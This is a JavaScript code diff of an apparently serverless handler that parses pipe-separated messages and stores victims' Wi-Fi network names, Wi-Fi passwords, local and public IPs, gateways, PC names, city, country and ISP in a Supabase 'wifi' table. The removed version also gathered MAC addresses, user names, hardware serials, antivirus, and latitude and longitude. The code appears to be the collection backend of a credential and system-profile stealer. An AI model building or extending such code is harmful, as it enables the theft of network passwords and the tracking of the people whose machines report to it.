@@ -10,39 +10,19 @@ exports.handler = async (event) => {
         const params = new URLSearchParams(event.body);
         const message = params.get("message");
 
-        const get = (prefix) => {
-            const regex = new RegExp(prefix + "([^~]+)");
-            const match = message.match(regex);
-            return match ? match[1].trim() : "";
-        };
+        const parts = message.split(" | ");
+        const reseau = parts[0].replace("Réseau: ", "").trim();
+        const brut = parts[1] || "";
+        const mot_de_passe = brut.includes(":") ? brut.split(":").slice(1).join(":").trim() : brut.trim();
+        const ip = (parts[2] || "").replace("IP: ", "").trim();
+        const passerelle = (parts[3] || "").replace("Passerelle: ", "").trim();
+        const pc = (parts[4] || "").replace("PC: ", "").trim();
+        const ip_public = (parts[5] || "").replace("IP_PUBLIC: ", "").trim();
+        const ville = (parts[6] || "").replace("Ville: ", "").trim();
+        const pays = (parts[7] || "").replace("Pays: ", "").trim();
+        const fai = (parts[8] || "").replace("FAI: ", "").trim();
 
-        await supabase.from("wifi").insert([{
-            reseau:      get("RESEAU:"),
-            mot_de_passe: get("MDP:"),
-            signal:      get("SIGNAL:"),
-            ip:          get("IP:"),
-            passerelle:  get("GW:"),
-            mac:         get("MAC:"),
-            pc:          get("PC:"),
-            user_pc:     get("USER:"),
-            os:          get("OS:"),
-            cpu:         get("CPU:"),
-            gpu:         get("GPU:"),
-            ram:         get("RAM:"),
-            disque:      get("DISK:"),
-            modele:      get("MODELE:"),
-            fabricant:   get("FABRICANT:"),
-            serial:      get("SERIAL:"),
-            av:          get("AV:"),
-            ip_public:   get("IPPUBLIC:"),
-            ville:       get("VILLE:"),
-            pays:        get("PAYS:"),
-            region:      get("REGION:"),
-            cp:          get("CP:"),
-            fai:         get("FAI:"),
-            lat:         get("LAT:"),
-            lon:         get("LON:"),
-        }]);
+        await supabase.from("wifi").insert([{ reseau, mot_de_passe, ip, passerelle, pc, ip_public, ville, pays, fai }]);
 
         return { statusCode: 200, body: JSON.stringify({ success: true }) };
     }
